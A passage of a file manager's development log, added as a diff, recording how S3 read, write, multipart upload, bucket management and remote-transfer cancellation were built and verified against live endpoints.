+  the Size column already uses. Invisible to every fixture — each carries a real date — and obvious
+  in the first second of looking at the app.
+
+Slice 4 landed 2026-08-13 and is the **write half**: `createDirectory`, `createFile`, `moveItem`,
+`removeItem`, and `copyFile`'s two new directions (`S3DeleteBatch`, `S3Backend+Write`; +36 tests,
+`capabilities` now `[.read, .write]` and `acceptsUploads` gains S3). Everything was probed first
+against a local endpoint that **verifies SigV4 by hand** — a real signature check rather than a
+mock, which is the `moto` lesson applied: a wrong secret is refused there, so a pass is evidence.
+
+- **The payload-signing question is settled, and on the merits rather than by preference.** It was
+  never really "which does AWS accept" — measured on one 512 MiB upload, `-T` peaks at **5.3 MB**
+  resident and `--data-binary @` at **1.08 GB**, twice the file. A file manager cannot hold every
+  uploaded file twice in RAM to buy a payload digest, so `-T` is the only viable shape and
+  `UNSIGNED-PAYLOAD` — what S3 documents for a stream over HTTPS — comes with it. The request is
+  still fully signed; the bytes are TLS's to protect.
+- **Three spellings of "write nothing" and only one is safe.** `-T /dev/null` sends
+  `Transfer-Encoding: chunked` with `UNSIGNED-PAYLOAD` (which S3 rejects — a chunked upload needs
+  its own streaming signature) and reports 5 bytes uploaded for an empty file, which is the chunk
+  framing; a bare `-X PUT` sends no `Content-Length` at all. `--data-binary ""` states its own
+  emptiness. And **`-T` against a URL ending in `/` appends the local file's basename** — measured,
+  `trailing/tiny.txt` — so an upload URL must never end in a slash, while a folder marker's must.
+- **`curl` signs `x-amz-copy-source` and `Content-MD5` and produces neither.** Both appear in
+  `SignedHeaders`, which is what makes the rename primitive and the batch delete reachable at all;
+  the copy source's *encoding* and the digest's *value* are ours. A wrong digest signs perfectly and
+  only the server catches it, so the probe was made to enforce `BadDigest` before that was believed.
+- **A folder move needed no new job type, which is the whole reason it is affordable.**
+  `moveItem` answers `EXDEV` for a prefix and `CopyEngine.perform` already falls back to a recursive
+  copy-then-delete on exactly that signal — on the operation queue, with progress, cancellation,
+  conflict policy and a per-item failure report. The same signal `RemoteTransportBackend` sends for
+  a cross-*backend* move, used here for a cross-*shape* one.
+- **A batch delete's body is the outcome, not its status.** A 200 can carry per-key `<Error>` rows,
+  so a status-only reader reports a folder as deleted with the files a bucket policy protects still
+  in it. Batched at 1000, one request per thousand keys instead of one per key on a verb where every
+  request is billed.
+
+Verified live end-to-end by a harness compiled in Swift 6 mode against the **real** core and the
+app's own `S3CurlTransport` source: create a folder, upload, round-trip the bytes, rename (including
+a name carrying a space, `+` and `#` through both sides of the copy-source header), defer a prefix
+move with `EXDEV`, delete one object, sweep a nested prefix in one batch, and a wrong-secret control
+that had to be refused.
+
+Slice 5 landed 2026-08-13 and is **multipart upload**, which closes the last thing that could make
+an ordinary F5 fail on size alone: S3 refuses a single `PUT` above 5 GiB, so before this a large
+file was rejected at the end of however long it took to offer the whole thing. `S3MultipartPlan`,
+`S3MultipartDocument`, `S3PartSlice` and `S3Backend+Multipart` (+38 tests), with the four verbs on
+`S3ProcessArguments`, `S3Transport` and `S3CurlTransport`. Everything below was measured against a
+local endpoint that verifies SigV4 by hand, before any Swift.
+
+- **A part must be a file on disk, and the natural fix for that is a trap.** `-T` is the only
+  affordable upload shape (5.3 MB resident against `--data-binary`'s 1.08 GB on 512 MiB), and it
+  needs something it can `fstat` for a `Content-Length` — a part piped to `-T -` goes out
+  `Transfer-Encoding: chunked`, which S3 rejects for an `UNSIGNED-PAYLOAD` upload. Adding
+  `-H "Content-Length: N"` does **not** fix it: `curl` then sends *both* headers, a contradictory
+  pair that a permissive endpoint reads happily and a real one refuses. So each part is cut to a
+  temp slice, which costs one part of temp space and roughly 1 % of a real upload's wall time.
+- **Two zero-copy routes were measured working and both were declined**, which is worth recording
+  because each looks like the obvious answer. Moving the credential to `-K /dev/fd/3` frees stdin
+  for `--data-binary @-` and signs a *real* payload digest — but `Foundation.Process` exposes only
+  three descriptors, so fd 3 means raw `posix_spawn`, and feeding a body while draining two pipes
+  turns a settled transport into a three-way pump. An APFS `clonefile` plus a truncate, `-C` and a
+  suppressed `Content-Range` sends the exact range with nothing copied — and is APFS-only, needs a
+  writable spot on the *source* volume, and so needs the slice path as its fallback anyway.
+- **The threshold is policy at 64 MiB, well below the 5 GiB the service forces**, because multipart
+  buys two things a single `PUT` cannot: a retry unit smaller than the file, and a progress counter
+  that moves. The whole object is one `curl` invocation on the single-`PUT` path, so a 4 GiB upload
+  showed nothing moving for its entire duration.
+- **An abandoned upload is a bill.** S3 stores the parts of an unfinished upload and charges for
+  them, invisibly to an ordinary listing, so every failing exit aborts — and the abort deliberately
+  swallows its own failure, since the error the caller is carrying is the one worth reporting.
+- **A completion can fail inside a 200**, the same shape `DeleteObjects` was *measured* to have, so
+  the body is read as well as the status. Reading only the status would report a successful upload
+  of an object that does not exist.
+
+Verified live by the same harness against that endpoint, with the server's own log as the judge
+rather than the client's opinion: a 70 MiB file went out as 4 × 16 MiB + 1 × 6 MiB, every part with
+an exact `Content-Length` and **no chunked framing anywhere**, reassembled byte-identical, stat'ed
+at its full size; a small file still took one `PUT`; a refused part ran `create → part → part →
+abort` and never completed; and a wrong-secret control was refused with `SignatureDoesNotMatch`.
+
+Slice 6 landed 2026-08-13 and is the **app pass** — the write half driven through the real UI rather
+than through a harness, and the two gaps that only that could show. The probe endpoint grew a
+server-side copy and a `DeleteObjects` batch (both verifying `Content-MD5` and the signature by
+hand), the app was driven against it by computer-use, and every request was read back out of the
+server's log: F7 sent `PUT /probe/from-app/` with `Content-Length: 0` and the empty string's real
+SHA-256 — no chunked framing; F5 sent the file as `UNSIGNED-PAYLOAD` with an exact length; F2 on a
+name carrying a space came through as `x-amz-copy-source: /probe/hello.txt` → `renamed%20by%20app.txt`
+followed by the delete; F8 on a folder swept three keys in **one** batch. So the wire shape Slices 4
+and 5 were designed to produce is what the app actually produces. The two things it found were both
+in the app and neither is S3-specific in its cause:
+
+- **A remote pane had no `..` row, a dead Backspace and a grayed Go Up** — `parentRowCount`,
+  `goToParent()` and the Go menu's validator each spelled the rule `backend == .local`, so this had
+  been true for SFTP since M5 and FTP since M13 as well. It is the "one rule, several spellings"
+  trap in its worst form, because a *missing* row shows nothing: the pane is an ordinary listing, and
+  both remote parsers correctly strip the server's own `..`, so there was no accidental row either.
+  Walking into an **empty** bucket folder is what removes every alternative at once — no rows, no
+  Backspace, no menu item, the crumb the only way out. One `canGoToParent` now answers it for all
+  three surfaces, deliberately still excluding a results snapshot, whose synthetic parent is not
+  somewhere to go — and a fourth site fell out of naming it, the `cursorOnParentRow` seed, which had
+  been parking an empty results pane's cursor on a row that pane does not draw. Re-verified live: the
+  same empty folder now carries `..`, Backspace walks up onto the row it came from, and Go Up is
+  enabled.
+- **A bucket root had no name.** `VFSPath.displayName` named an archive, an SFTP account and an FTP
+  account and stopped there, so the tab chip read `/` directly above a crumb reading
+  `probe — 127.0.0.1` — the contradiction that property's doc comment exists to prevent — and F7
+  offered «Create a folder in "/"», which `creationDirectoryName` had been saying at an SFTP or FTP
+  root all along. The root title now has one definition (`backendRootTitle`) that both the chip and
+  the crumb read, since they need it at *different depths* and that is exactly how the two drifted.
+
+The `..` widening is verified live on S3 and by test on SFTP and FTP — they share the one predicate,
+but nobody connected to a real server to watch it.
+
+Slice 7 landed 2026-08-13 and is the **bucket picker**: the connect sheet can now fill in the one
+field nothing else could supply. `S3Account`, `S3BucketListParser`, `S3BucketEnumeration` and
+`S3ProcessArguments.listBuckets` in the core (+17 tests); `S3CurlRunner`, `S3BucketLister` and
+`ConnectServerS3BucketPicker` in the app (+9). It is the deferral below answered in the shape that
+survives its own objection — an **assist, never a root**. The field stays a field, so a key scoped to
+one bucket loses nothing it had; only a key allowed to ask gains anything.
+
+- **The signature needed nothing new, and that was worth measuring rather than assuming.** Probed
+  against the endpoint that recomputes SigV4 by hand: `curl --aws-sigv4` signs a service-level
+  `GET /` — no bucket in the path *or* the host — with canonical URI `/`, an empty canonical query
+  and the real digest of the empty body, and it verified; a wrong secret against the same URL was
+  refused, which is the control that makes the pass evidence. So account-level access is a URL with
+  the bucket left out, which is exactly what `S3Account` is and why an `S3Location` with an ignored
+  `bucket` will not do: under virtual-host addressing the bucket lives in the *host*, where `GET /`
+  is S3's legacy `ListObjects` — a well-formed listing of the wrong thing, handed to a parser looking
+  for buckets.
+- **Both refusals are 403 and only the `<Code>` separates them**, which is the inverted classifier
+  arriving at one more site and this time deciding *who is told they have a problem*. `AccessDenied`
+  is the ordinary answer for a properly scoped key and must not read as a fault; `SignatureDoesNotMatch`
+  and `InvalidAccessKeyId` are worth reporting, because Connect is about to fail the same way. Both
+  were driven live, and the server's own log is what makes the claim sharp: the *denied* request's
+  signature **verified** — the credentials were fine and the policy said no — while the other
+  genuinely mismatched, and the app told them apart.
+- **These fixtures are from the API reference, not captured, and the suite says so.** There is no
+  public account to list and this Mac holds no AWS credentials, so unlike the object-listing suite —
+  real bytes off real buckets — a green run here proves the parser reads the documented shape and
+  tolerates its variations, not that it agrees with what AWS sends. Everything it does leans one way
+  (require only `<Name>`; read *both* continuation spellings, since the reference gives this response
+  `ContinuationToken` where every other paginated response says `NextContinuationToken`).
+- **Two AppKit bugs that only launching could find, and both fail in the quiet direction**: the
+  button drew perfectly and was unclickable because the form pins every control it is handed to
+  364 pt, so the row overflowed its grid cell (`NSView` does not clip; hit testing does respect
+  bounds); and then it was clickable only on its *rim*, because a stopped `NSProgressIndicator` is
+  still hit-tested. Both are in docs/NOTES.md ▸ AppKit.
+- **One wrong sentence found by using it**: the first click on a freshly opened sheet reported "The
+  access key or secret wasn't accepted" for a form that had sent nothing. An empty form now has its
+  own string, because a refusal is a claim about a server that has not been asked.
+
+Slice 8 landed 2026-08-13 and is the **first pass against a real third-party endpoint** — a paid
+S3-compatible account (`s3.lax.sharktech.net`), where every earlier slice had been verified against a
+local SigV4-verifying probe endpoint and anonymous reads of public AWS buckets. The whole write half
+was re-run through the real `S3Backend` and the app's own `S3CurlTransport`, compiled in Swift 6
+mode: listing, F7, upload, byte-exact download, F2 through a name carrying a space, `+` and `#`, the
+empty-file `PUT`, the `EXDEV` folder-move deferral, multipart (70 MiB → 4 × 16 MiB + 6 MiB, five
+progress reports, byte-identical round trip), server-side copy, single delete, a one-batch prefix
+sweep, and a wrong-secret control that was refused. Slice 7's bucket parser was scored against real
+`ListAllMyBuckets` bytes for the first time — its API-reference fixtures turned out faithful,
+including the empty-account shape a brand-new account actually returns.
+
+It found one real bug, and the shape of it is the milestone's own lesson arriving one layer lower.
+`S3ListingParser` trimmed whitespace off every XML value it read, so a key whose *edges* are
+whitespace was misnamed by one character — and everything that then addressed it by that name
+missed: F5 and F2 answered `notFound` for a row visible in the pane, F8 **reported success having
+deleted nothing**, and a common prefix of `" folder/"` entered *empty*. `stat` kept working
+throughout and is what hid it, since the trim applied to both sides of its comparison. It is
+unreachable against AWS by construction — AWS honors `encoding-type=url`, so the space arrives as
+`%20` and there is nothing to trim. The echo protects the decode; nothing protected the trim. Fixed
+by trimming per field (never a `<Key>` or `<Prefix>`, always a size, date, boolean or token), with
+the same one-line shape corrected in `S3DeleteBatch`'s response parser and deliberately left alone in
+`S3BucketListParser`, where a bucket name cannot carry whitespace. +6 tests in a suite of their own,
+whose fixtures are this endpoint's bytes precisely because AWS cannot produce them; the negative
+control fails 10 assertions with the fix backed out. Re-verified live: the row now draws its space,
+downloads, renames, and deletes for real, and the folder opens with its file in it.
+
+Three endpoint facts came out of it that are worth having before the next S3-compatible server
+(docs/NOTES.md ▸ curl ▸ S3): the region is **not validated** there and no `x-amz-bucket-region`
+header is sent, so the wrong-region 301 path cannot be exercised at all; a raw continuation token
+fails as **`SignatureDoesNotMatch`** rather than AWS's `InvalidArgument`, which would have sent a
+user to retype a credential that was never wrong; and a **single-label wildcard certificate** forces
+path-style addressing, failing at curl exit 60 before any S3 conversation — settleable from the
+certificate in one `openssl s_client` run rather than by trying both modes.
+
+The **UI pass against the same endpoint** followed, driven by computer-use, with the server's own
+listing as the judge rather than the pane's. Connect through the sheet, the bucket picker filling its
+field from the live account, the bucket root listing with folders drawing `—` for size *and* date,
+Enter into a folder, Backspace back out over a real `..` row, F5 out, F7, F2 and F8 — and the server
+afterwards held exactly what the pane claimed. Two things it confirmed that only the real UI could:
+F7's sheet reads «Create a folder in "dirnex-test — s3.lax.sharktech.net"» rather than the `/` that
+Slice 6 fixed, and the whitespace fix survives the whole stack — the trailing-space object drew with
+its space, and F5 landed it on the local disk as `edge ` with the byte intact.
+
+The region field was **emptied** in the same pass. It had been prefilled `us-east-1`, which states a
+fact about the user's server that the app does not know: measured, this endpoint verifies the
+signature while ignoring the credential scope's region entirely. The field now starts blank behind
+its placeholder and resolves to `us-east-1` when read — in one funnel both readers share, since the
+bucket picker's own guard rejects an empty region and would otherwise refuse to ask on a form whose
+Connect button works. It cannot simply be dropped: SigV4 always names a region, and for the Amazon
+service the region *derives the host*, where empty would address `s3..amazonaws.com`. Defaulting is
+safe there because a bucket elsewhere answers 301 and the connect flow already re-aims at the region
+the service names. Verified live with the field left blank end to end — the picker listed the account
+and the connect succeeded.
+
+**The UI pass found one wrong sentence, and it is now fixed.** Connecting to this endpoint with the
+default virtual-host addressing fails, correctly, at curl exit 60 — and the sheet reported "The
+endpoint's TLS certificate couldn't be verified. A server with a self-signed certificate has to be
+reached over http:// for now." Every clause of that was wrong here: the certificate is a valid
+GoDaddy-issued `*.lax.sharktech.net`, nothing is self-signed, and the actual remedy is the
+**path-style checkbox two rows above** — a wildcard is one label deep (RFC 6125), so it cannot cover
+`<bucket>.s3.lax…`. The app was diagnosing an addressing problem as a trust problem and pointing the
+user at **plaintext HTTP** as the cure, on the default path for any S3-compatible provider whose
+certificate is not wildcard-deep — i.e. the first thing such a user meets.
+
+`s3CertificateDetail(location:)` now splits the one exit code by what the *request* asked for, since
+that is what decides which failure it is. Under virtual-host addressing the name being verified is
+`<bucket>.<host>` rather than the endpoint that was typed, so the message names that host and the
+path-style checkbox; under path-style the verified name *is* the endpoint, so a failure really is
+about trust and the original sentence stands. It is keyed on the addressing mode rather than on the
+service picker deliberately: AWS reaches the identical state, because `*.s3.<region>.amazonaws.com`
+is also one label deep and so a bucket whose own name contains dots cannot be addressed virtual-host
+over TLS either — path-style is the same answer there. The checkbox is named by interpolating its
+own title rather than by spelling it out, so the sentence names the control the user is looking at in
+all fourteen languages instead of becoming the second copy of a display string that gets localized
+once. +4 tests; the new key is translated in all fourteen and verified in the compiled `.strings`
+rather than in the catalog.
+
+Verified live on the endpoint that produced it, both directions in one run: the failing connect now
+reads «The endpoint's TLS certificate couldn't be verified for "dirnex-test.s3.lax.sharktech.net".
+The bucket is part of the host name until "Path-style addressing" is turned on, and most certificates
+don't cover that», and ticking that box and pressing Connect again succeeds — which is what makes the
+new sentence *advice* rather than merely better wording.
+
+**What S3 will not be able to do, and it is better to state it than to discover it.** S3 is not a
+filesystem: rename is copy-then-delete (O(size), and N copies for a "folder"), `createDirectory` has
+no operation behind it beyond writing a marker, there is no settable mtime, no permissions and no
+symlinks — so `copyMetadata` is a no-op and `DirectorySync` by timestamp is as unreliable as it is
+over FTP. Every listing is a billable request, which makes the recursive sizer cost money over a
+bucket. `RemoteTransportBackend`'s four write verbs were shaped for FTP and SFTP, where they are
+genuine filesystem operations; S3 fits the *transport* shape, so it conforms to
+`ConnectionScopedBackend` (the guard all three need) and answers the four verbs itself — which is
+what Slice 4 is. Two consequences survive that and are permanent: nothing about a folder rename or a
+folder delete is **atomic**, and a byte counter cannot advance during a server-side copy without
+paying a round trip per object for it (~25 min of pure latency on a 50 000-file prefix), so those
+copies report items rather than bytes.
+
+Slice 9 opened 2026-08-13 and is **bucket management** — the deferral below, answered. Core-only and
+additive so far (`S3BucketName`, `S3AccountBackend` with its own `S3AccountTransport`, the account
+descriptor and `bucketLocation`, three argument builders, two `VFSUnsupportedReason` cases
+translated in all fourteen; +30 tests, app code untouched). An account is a **second root, never the
+only one** — the pane lists buckets as rows, so F7 creates one and F8 deletes one through the
+machinery that already exists, and the objection below survives intact: a key that cannot call
+`ListAllMyBuckets` keeps exactly what it had.
+
+Everything was probed before any Swift — a local endpoint that recomputes SigV4 by hand for the
+request shape, then the real third-party account for the semantics, with every probe bucket cleaned
+up afterwards. Two findings changed the code that was about to be written:
+
+- **Creating a bucket that already exists answers 200, silently.** No `409`, no code, nothing
+  changed — so relying on the service means F7 on a taken name reports success and does nothing.
+  AWS *does* refuse (`BucketAlreadyOwnedByYou`), which is exactly why the check has to be ours: a
+  local stat first is the only behaviour that is correct on both. The `moto` lesson from Slice 4
+  arriving from the other side — this time the *real* server was the one being permissive.
+- **Every broken naming rule comes back as one indistinguishable `400 InvalidBucketName`.** Five
+  different mistakes — uppercase, two characters, an underscore, an IP-shaped name, 64 characters —
+  one sentence, "The specified bucket is not valid", with nothing a user can act on. So
+  `S3BucketName` is not a round-trip optimisation: refusing locally is the only way anyone learns it
+  was the capital letter. A **dotted** name is legal and was accepted in the same run, and is the
+  one that strands a user later, since a wildcard certificate is one label deep — a warning about
+  addressing, never a naming refusal.
+
+Three more that shaped the verbs: a successful `DeleteBucket` is **204**, so a classifier keyed on
+`== 200` fails every correct delete (the resumed download's 206, on another verb); `409
+BucketNotEmpty` needs its own sentence because the shared 409 mapping is `alreadyExists`, which
+answers a *delete* with "this already exists"; and `HeadBucket` sends **no** `x-amz-bucket-region` on
+this endpoint, so entering a bucket keeps the account's region — correct there precisely because that
+server does not validate regions. The trailing slash `S3Location.bucketURL` already produces is safe
+on both write verbs (probed both ways), so the account arguments reuse the one definition of how a
+bucket is addressed rather than growing a second.
+
+The app pass landed the same day and is four **backend crossings** — the connect sheet's
+empty-bucket path, the saved-account sidebar row, entering a bucket as a *connect* (so the region
+correction applies), and **Backspace out of a bucket root**, which is a crossing rather than a path
+walk since a bucket root's path is `/` and has no parent to find. It probes once before navigating,
+so a key that cannot list buckets gets a sentence where it is standing rather than a pane it has
+landed in that can only show an error. `PanelViewController+S3Account` holds all three gestures;
+`ServerEndpoint.s3Account` and `S3AccountCurlTransport` are what the sidebar and the composite need.
+
+- **A blank bucket field is an answer, not an omission**, and giving it a meaning is safe precisely
+  because it had none: `S3BucketName.minimumLength` is 3, so nothing that used to connect now
+  connects somewhere else. The cost is a typo landing in the account pane instead of an error, which
+  is one keystroke from recovery — the bucket meant is a row there. The placeholder carries the hint,
+  because a blank field that *does* something and says nothing is a feature nobody finds; it is the
+  only always-on surface for it, since the picker button beside it explains itself only once clicked.
+- **A case of its own rather than an optional bucket on `.s3`.** They are different *places* — two
+  backend ids, two requests, and a saved server has to come back as the one it was saved as — where
+  an optional field would make every existing reader ask a question that has only ever had one
+  answer. `S3Account` is disjoint from `S3Location` at both keys that matter (the `s3a://` scheme and
+  the Keychain account), so neither can ever be read as the other.
+- **`readAccount` had to start carrying the addressing mode**, and this is the slice's own instance
+  of the finding it keeps re-deriving: the account built for Slice 7's picker was built *without*
+  one, correctly, because a service request names no bucket. The moment an account became a place,
+  every bucket reached from it — plus `CreateBucket` and `DeleteBucket` — spelled one into a URL, and
+  two builders of the same value disagreeing is how this project loses an afternoon.
+- **Entering a bucket routes through `connectS3`** rather than re-implementing it, so the 301 region
+  correction, the Keychain filing and the certificate sentences apply to a row the same way they
+  apply to the sheet. The one thing that genuinely differs is the TLS message: an account request is
+  `GET https://<endpoint>/` with no bucket in the host, so the path-style advice a bucket's failure
+  gives would name a checkbox that could not have caused it.
+- **F7 there names a bucket, not a folder.** Left generic it would have prefilled "untitled folder",
+  which breaks two naming rules by construction — a default that can only earn a refusal about a rule
+  the user never chose to break — and the folder-shaped slash check would have preempted
+  `S3BucketName`'s sentence, which is the one that says *which* rule broke.
+
+Verified live against the real third-party account (path-style, which its single-label wildcard
+certificate requires): connect with no bucket → the account pane lists its bucket; Enter → the bucket
+lists, with a `..` row; Go Up → back to the account with the cursor on the bucket it left; and F7's
+create + F8's delete of a scratch bucket, confirmed gone from the account afterwards by an
+independent `ListAllMyBuckets`. Two negative controls make that mean something: with the endpoint
+stopped all four fail, and with `leavesBucketForItsAccount` neutered the walk-up fails **while its
+neighbours pass** — landing the cursor on a folder *inside* the bucket, which is exactly the bug the
+branch exists to prevent. `S3AccountLiveIntegrationTests` is that run, kept and gated on a config
+file. What no automated signal covers is the *drawn* surfaces — the sheet's placeholder, the sidebar
+row, the account crumb, the New Bucket dialog — which want one look by hand.
+
+**Follow-up, 2026-08-13 — a virtual-host TLS failure now corrects itself.** Reported by a user
+connecting with the bucket field blank and pressing Enter on a bucket: exit 60, and a sentence naming
+a checkbox that was not on screen. Slice 9's own reasoning above says why the connect could not have
+caught it — a service request has no bucket in the host, so the wildcard covers it and the probe
+validates nothing about how a *bucket* will be addressed. The fix is the second self-correction in
+`connectS3`, on the same argument the region one makes: path-style still verifies the certificate,
+against the host the user typed, so there is no weaker outcome to accept and nothing to ask about.
+It also *measures* what the sentence could only guess — exit 60 cannot separate a wildcard that is
+one label too shallow from a genuinely self-signed endpoint, and the retry answers which it was,
+fixing the case the shipped message had backwards (it advised a self-signed endpoint to tick a
+checkbox that cannot help it). `savedServerName` carries the answer back into the saved record, which
+for a bucket entered from an account pane is the **account's** — the live account is left alone
+because its addressing rides in its descriptor and its descriptor is its backend id. +10 tests, both
+directions of the negative control run. Details in docs/NOTES.md ▸ curl for S3.
+
+The deferral this answers, kept for its reasoning: **account-level browsing** (`ListAllMyBuckets`) as
+a second root — a key scoped to one bucket is the ordinary way these are issued, so an account-rooted
+design fails at the root for exactly the users whose credentials are set up properly. Slice 7 is why
+the distinction was worth keeping: the same call makes an excellent **assist** — a picker beside a
+field that is still typed — precisely because a key that cannot make it costs the user nothing. Slice
+9 is the third position that argument allows and the one that was missed for two slices: an
+*optional* root is neither the root nor a mere assist, and it inherits the assist's whole safety
+argument. Worth carrying past S3: when a capability is rejected for what it does at the *root*, ask
+what it does as an *option* before filing it away. **Multipart upload**
+was the other one and closed with Slice 5 above. The **upload payload-signing question**
+closed with Slice 4 and did not need credentials in the end: it looked like "which does AWS accept"
+and was really a memory measurement, since `--data-binary @` holds twice the file and `-T` holds
+nothing, so `UNSIGNED-PAYLOAD` arrives as a consequence rather than as a choice. Worth keeping the
+shape of that mistake — a local `moto` mock had answered the *acceptance* form of it wrongly in the
+confident direction (silently storing an empty object for the signed form while a trace showed the
+bytes had gone out fine), and the question it was asked was the wrong one anyway.
+
+#### Slice 10 — opened 2026-08-14: reading and editing a remote file in place
+
+Quick View (⌘Y / ⌃Q / F3), F4 Edit with write-back, and ⏎ to open — for **every** remote backend,
+not for S3 alone.
+
+**The core half landed 2026-08-14, additive and app-untouched** (`RemoteFileRevision` with
+`RemoteRevisionEvidence`, `RemoteFetchPolicy`, and one predicate on `VFSBackendID`; +24 tests, 2351
+core tests green, both linters clean). It is deliberately the part none of the five probes below can
+change — every one of them is about the transport or the app, so the value types were affordable
+first and the probes still gate the app pass rather than being skipped.
+
+- **`isSuperseded(by:)` and "how much is that answer worth" are two questions**, and folding them
+  into one confidence number would have made the second unanswerable. A *difference* found here is
+  always real evidence of a write; *no* difference is only as strong as the fields compared, so
+  `evidence(comparedWith:)` names the blind spot instead — `.entityTag`, `.sizeAndTimestamp`,
+  `.sizeAndApproximateTimestamp`, `.sizeOnly` — and the app words each rather than showing a
+  percentage nobody can act on. `.sizeOnly` outranks the approximate case on purpose: with no date
+  at all there is nothing to be approximate *about*, and the FTP sentence there would name a
+  weakness that is not the one in play. **All of it was removed on 2026-08-23** — the grading
+  existed to produce those four sentences, and when the unchanged case stopped raising a dialog it
+  had no reader left (▸ After M19). `isSuperseded(by:)` is now the whole comparison;
+  `hasApproximateTimestamps` and `timestampIsApproximate` went with it, and the FTP fact they
+  carried lives in [NOTES.md](NOTES.md) ▸ curl and in `VFSBackendID.isFTP`.
+- **The FTP caveat rides on the value, not on the call site.** `VFSBackendID.hasApproximateTimestamps`
+  is the one spelling — a `LIST` stamp is year-less, zone-less and on the server's clock, which is
+  fine to display and sort by and is not something to decide "nobody has touched this since" on —
+  and `RemoteFileRevision(_ entry:)` reads it off the entry's own path, so a caller wording a
+  conflict dialog cannot forget to ask. Named beside `isRemoteConnection` and `acceptsUploads`
+  because this milestone has now re-derived the one-rule-several-spellings finding four times.
+- **The ETag field ships with no producer, and it earns its place by changing the *rule*.** A
+  matching tag short-circuits the comparison outright rather than joining the disjunction — a
+  matching size and time is an absence of evidence where a matching tag is proof — and the two
+  cannot be collapsed after the fact. Nothing supplies one yet (`S3ListingParser` reads a listing's
+  `<ETag>` past without keeping it, and `FileEntry` has no field to carry it); the negative control
+  is what makes the field testable today, since without the tags the same-size same-second rewrite
+  is invisible to every other assertion in the suite.
+- **`RemoteFetchPolicy` is a table because the numbers are expected to move.** Preview at 16 MiB
+  asks first — the least committed gesture, the most expensive to get wrong, and every renderer
+  behind it holds the whole file — while open and edit sit at 64 MiB, reusing `S3MultipartPlan`'s
+  existing statement of where a transfer stops feeling instant rather than minting a second number
+  that means the same thing. Edit is deliberately *not* lower than open: the file F4 was pressed on
+  is one the user intends to change, so the dialog would stand in front of the work rather than in
+  front of a look. The row that is not a number is the least arguable — an unknown (or negative,
+  i.e. unparsed) size confirms, because not knowing how much is about to be pulled is exactly when
+  to ask.
+- Four negative controls were run and each failed only its own assertions: dropping the entity-tag
+  short-circuit, passing `FileEntry.unknownDate` through as a date, flattening
+  `hasApproximateTimestamps` to `false`, and clamping a negative size to zero.
+
+**The five probes ran 2026-08-14** against the real third-party account, plus a deliberately slow
+local HTTP server for the one that is about our own process plumbing rather than about S3. Two of
+them change the app pass, one holds, one is unanswerable on this endpoint, and one found a bug older
+than this milestone.
+
+- **1 — Cancel mid-GET: Stop does not stop, and the plan's worry was the wrong way round.** Measured
+  through the real `S3Backend` and the app's own `S3CurlTransport`: Stop pressed at 1.00 s,
+  `copyFile` returned at **16.98 s** — the full time the server needed — with the server's own log
+  reading `SERVED all 4194304 bytes` rather than a client disconnect, the destination holding the
+  **complete** file, and `CancellationError` thrown after all of it. The plan feared a half-download
+  cached as a preview; that cannot happen. What happens instead is that the whole cost is paid and
+  the result thrown away. **It is remote-generic and pre-existing**: `isCancelled` is honoured at
+  the file boundary in `S3Backend`, `FTPBackend` and `SFTPBackend` alike, and no transport calls
+  `process.terminate()` except from its own timeout backstop — so Stop has never abandoned a
+  single-file remote transfer, since M5. A preview or edit fetch therefore cannot bound its cost
+  with `isCancelled`, which is the one thing the slice was going to lean on.
+- **2 — A Glacier object is unanswerable here, and that is the finding.** Every non-`STANDARD`
+  storage class is refused outright: `REDUCED_REDUNDANCY`, `STANDARD_IA`, `ONEZONE_IA`,
+  `INTELLIGENT_TIERING`, `GLACIER`, `DEEP_ARCHIVE` and `GLACIER_IR` all come back **400
+  `InvalidStorageClass`**, and only `STANDARD` is accepted. There is no archived-object state to
+  reach, so `403 InvalidObjectState` cannot be exercised without an AWS account — any message we
+  write for it ships unmeasured, and should say so rather than being listed as verified.
+- **3 — Read-after-write holds on this endpoint.** Six writes, six immediate reads: the GET returned
+  the bytes just written every time, and — the half that actually matters — the **listing** reported
+  the new size immediately, which is what `stat` reads and therefore what the conflict check rests
+  on. The endpoint that has already inverted two of this milestone's rules does not invert this one.
+- **4 — The edge-whitespace key survives download and save-back.** Four names (`trailing `,
+  ` leading`, `mid dle`, `plus+hash#and space`) × six assertions, all green — and the design of the
+  probe is the lesson. The first version re-typed the name it had just uploaded, which is blind to
+  Slice 8's bug **by construction**: the trim was invisible precisely because both sides of a
+  hand-built comparison carried it. Rewritten to address the object through the path the *listing*
+  produced, the way the app does, the negative control fires immediately — reintroducing the `<Key>`
+  trim kills the download with `notFound` on `/probe10/edge/trailing`, Slice 8's symptom exactly.
+  Two earlier controls were **inert** and worth recording so they are not tried again: handing the
+  key over raw dies at the first verb rather than creating a sibling, and percent-encoding the
+  separator changes nothing at all, because this endpoint normalizes `%2F` back to `/`.
+- **5 — Time to first byte is 0.51 s, and the inherited 400 ms sheet delay is below the floor.**
+  Five runs, 0.512–0.519 s, decomposing as DNS 0.003 + connect 0.17 + TLS 0.34 + ~0.17 s of server
+  turnaround. Every request is a fresh `curl` — HTTP keeps no session, which is why the transport
+  re-signs each time — so **half a second is the floor for any remote fetch on this endpoint**, not
+  the cost of a large one. `CloudDownloadPrompt`'s 400 ms was tuned against iCloud materialization,
+  where the wait is either ~0 or long; against a network round trip it means the sheet appears on
+  *every* preview and is dismissed ~115 ms later. The threshold has to clear a round trip.
+
+**The cancellation bug probe 1 found is fixed, 2026-08-14, across all three remote backends** —
+taken deliberately wide rather than S3-only, because the slice is remote-generic by design and
+because two spellings of one rule is the trap this milestone has now re-derived five times. The
+seven byte-moving verbs of `S3Transport`, `FTPTransport` and `SFTPTransport` take an `isCancelled`;
+the metadata verbs deliberately do not; and `ProcessWaiting.wait` is the one home of the poll that
+replaces the single bounded `DispatchGroup.wait` all three transports had. +7 core tests
+(`RemoteTransferCancellationTests`, one suite for all three rather than one test each, for the same
+reason the fix is wide).
+
+- **Re-measured on the server that found it: 16.98 s → 1.11 s** against a Stop pressed at 1.00 s,
+  matching the 100 ms poll, with the server logging no `SERVED all` — the client really did go away.
+- **The obvious assertion is worthless here, and the negative control is what showed it.** With one
+  backend reverted, every `#expect(throws: CancellationError.self)` still passed: the *post*-transfer
+  boundary check throws whether or not anything stopped, which **is** the shipped bug. Each test
+  therefore rests on a record of whether the transfer verb was asked, and reverting FTP alone fails
+  exactly its two tests and no others.
+- **It makes a partial file possible for the first time, which is the hazard the plan expected to
+  find already present.** A cancelled download now leaves 278 528 bytes of a 4 MiB object where it
+  used to leave all of them. That is correct for F5 — it is the partial `-C -` resumes from — and it
+  is precisely why the slice's cache must **drop** what a cancelled fetch left rather than keep it: a
